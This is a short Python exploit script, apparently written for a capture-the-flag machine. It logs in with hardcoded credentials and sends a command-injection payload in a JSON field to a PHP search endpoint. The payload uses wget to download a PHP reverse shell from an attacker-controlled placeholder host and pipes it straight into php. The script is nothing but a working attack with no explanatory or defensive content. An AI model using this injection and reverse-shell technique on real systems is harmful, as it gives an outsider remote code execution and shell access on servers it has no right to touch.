#!/usr/bin/env python3
import requests

target_ip = 'target_ip'
path = '/assets/php/search.php'
user = 'rascal'
password = 'yorkie'

atacker_site_url = 'http://atacker_site_url'
payload = f"\"; wget -O - -q {atacker_site_url}/php-reverse-shell.php | php; \""

response = requests.post(url=f'http://{target_ip}{path}', auth=(user, password), json={"target":payload})
print(response.json())
